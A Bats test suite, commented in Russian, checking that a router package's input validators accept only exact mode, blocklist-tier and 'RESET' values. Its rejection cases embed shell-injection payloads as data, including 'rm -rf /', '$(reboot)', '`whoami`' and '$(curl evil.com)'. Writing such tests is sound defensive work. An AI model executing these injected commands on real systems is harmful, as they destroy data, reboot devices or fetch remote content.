#!/usr/bin/env bats
# Тесты валидаторов пользовательского ввода: cheburnet_valid_mode,
# cheburnet_valid_tier, cheburnet_valid_factory_confirm.
#
# Поверхность атаки = всё что приходит в rpcd-cheburnet через jsonfilter из
# unauth-сессии. Проверяем что любая попытка инъекции (shell-метасимволы,
# NUL, нестандартный регистр, лишние пробелы) — отвергается.

load '../helpers/setup'

# ─── cheburnet_valid_mode ───────────────────────────────────────────────────

@test "valid_mode: 'home' допустимо" {
    run cheburnet_valid_mode "home"
    assert_success
}

@test "valid_mode: 'travel' допустимо" {
    run cheburnet_valid_mode "travel"
    assert_success
}

@test "valid_mode: пустая строка отвергается" {
    run cheburnet_valid_mode ""
    assert_failure
}

@test "valid_mode: верхний регистр отвергается (case-sensitive)" {
    run cheburnet_valid_mode "HOME"
    assert_failure
    run cheburnet_valid_mode "Travel"
    assert_failure
}

@test "valid_mode: лишние пробелы отвергаются" {
    run cheburnet_valid_mode " home"
    assert_failure
    run cheburnet_valid_mode "home "
    assert_failure
}

@test "valid_mode: shell-инъекция отвергается" {
    run cheburnet_valid_mode "home; rm -rf /"
    assert_failure
    run cheburnet_valid_mode '$(reboot)'
    assert_failure
    run cheburnet_valid_mode '`whoami`'
    assert_failure
}

@test "valid_mode: путь / wildcard отвергаются" {
    run cheburnet_valid_mode "/home"
    assert_failure
    run cheburnet_valid_mode "home*"
    assert_failure
}

@test "valid_mode: похожие но не точные значения отвергаются" {
    run cheburnet_valid_mode "homee"
    assert_failure
    run cheburnet_valid_mode "trave"
    assert_failure
    run cheburnet_valid_mode "Home"
    assert_failure
}

# ─── cheburnet_valid_tier ───────────────────────────────────────────────────

@test "valid_tier: каждый из 10 валидных тиров принимается" {
    for t in light normal pro pro.plus ultimate tif tif.medium tif.mini multi.pro fake; do
        run cheburnet_valid_tier "$t"
        assert_success
    done
}

@test "valid_tier: пустая строка отвергается" {
    run cheburnet_valid_tier ""
    assert_failure
}

@test "valid_tier: 'hagezi:pro' (с префиксом) отвергается" {
    # Функция принимает голое имя тира — префикс 'hagezi:' добавляет
    # set_blocklist_tier при записи в config. Передавать его сюда = атака.
    run cheburnet_valid_tier "hagezi:pro"
    assert_failure
}

@test "valid_tier: shell-инъекция отвергается" {
    run cheburnet_valid_tier "; rm -rf /"
    assert_failure
    run cheburnet_valid_tier 'pro; reboot'
    assert_failure
    run cheburnet_valid_tier 'pro && reboot'
    assert_failure
    run cheburnet_valid_tier '$(curl evil.com)'
    assert_failure
}

@test "valid_tier: лишние пробелы отвергаются" {
    run cheburnet_valid_tier "pro "
    assert_failure
    run cheburnet_valid_tier " pro"
    assert_failure
}

@test "valid_tier: верхний регистр отвергается" {
    run cheburnet_valid_tier "PRO"
    assert_failure
    run cheburnet_valid_tier "Pro"
    assert_failure
}

@test "valid_tier: похожие имена отвергаются" {
    run cheburnet_valid_tier "pro+"
    assert_failure
    run cheburnet_valid_tier "professional"
    assert_failure
    run cheburnet_valid_tier "tif.large"
    assert_failure
}

# ─── cheburnet_valid_factory_confirm ────────────────────────────────────────

@test "valid_factory_confirm: только 'RESET' принимается" {
    run cheburnet_valid_factory_confirm "RESET"
    assert_success
}

@test "valid_factory_confirm: 'reset' (нижний регистр) отвергается" {
    run cheburnet_valid_factory_confirm "reset"
    assert_failure
}

@test "valid_factory_confirm: 'Reset' отвергается" {
    run cheburnet_valid_factory_confirm "Reset"
    assert_failure
}

@test "valid_factory_confirm: пустая строка отвергается" {
    run cheburnet_valid_factory_confirm ""
    assert_failure
}

@test "valid_factory_confirm: 'RESET ' (с пробелом) отвергается" {
    run cheburnet_valid_factory_confirm "RESET "
    assert_failure
    run cheburnet_valid_factory_confirm " RESET"
    assert_failure
}

@test "valid_factory_confirm: похожие значения отвергаются" {
    run cheburnet_valid_factory_confirm "RESETT"
    assert_failure
    run cheburnet_valid_factory_confirm "yes"
    assert_failure
    run cheburnet_valid_factory_confirm "1"
    assert_failure
}

@test "valid_factory_confirm: shell-инъекция отвергается" {
    run cheburnet_valid_factory_confirm 'RESET; reboot'
    assert_failure
    run cheburnet_valid_factory_confirm '$(reboot)'
    assert_failure
}
